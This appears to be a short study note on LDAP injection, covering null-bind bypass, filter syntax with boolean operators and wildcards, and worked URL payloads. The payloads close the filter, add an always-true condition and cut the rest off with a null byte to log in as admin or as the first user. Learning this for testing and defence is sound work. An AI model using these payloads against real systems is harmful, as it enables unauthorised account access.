# **LDAP:**

- Some LDAP servers authorise NULL Bind: if null values are sent, the LDAP server will proceed to bind the connection, and the PHP code will think that the credentials are correct.
- To get the bind with 2 null values, you will need to completely remove this parameter from the query and send an empty body.

**LDAP syntax:**

- When you are retrieving a user, based on its username, the following will be used: ```(cn=[INPUT])```
- If you want to add more conditions and some boolean logic, you can use:
  - **A boolean OR using |** to get records matching [INPUT1] or [INPUT2]

        ```bash
          (|(cn=[INPUT1])(cn=[INPUT2]))
        ```

  - **A boolean AND using &** to get records for which the cn matches [INPUT1] and the password matches [INPUT2]

        ```bash
           (&(cn=[INPUT1])(userPassword=[INPUT2]))
        ```

  - As you can see, the boolean logic is located at the beginning of the filter. Since you're likely to inject after it, it's not always possible (depending on the LDAP server) to inject logic inside the filter, one is only able to inject some logic into it if it's just **(cn=[INPUT])**

  - LDAP uses the wildcard **`*`** character very often, to match any values.
  - This can be used for match everything **`*`** or just substrings (for example **`adm*`** for all words starting with adm)

  - As with other injections, we will need to remove anything added by the server-side code. We can get rid of the end of the filter, using a NULL BYTE (encoded as **%00**).

    &nbsp;

  **LDAP Injection View from laymans aspect:**

  - <https://url/?name=admin&password=admin> == **(&(cn=admin)(userPassword=admin))**
  - so when injecting the bracket:
    - <https://url/?name=admin)&password=admin> == **(&(cn=admin))(userPassword=admin))**
  - which shows we don't have the same number of opening and closing bracket hence the error msg:'Bad search filter'
  - so one needs to finish the ldap query properly then inject it with a condition that says always true
    - <https://url/?name=admin)(cn=*))%00&password=admin> == **(&(cn=admin)(cn=*))%00  (userPassword=admin))**
  - To authenticate as the first record in the ldap server the exploit will be as below:
    - <https://url/?name=*)(cn=*))%00&password=admin> == **(&(cn=*)(cn=*))%00  (userPassword=admin))**
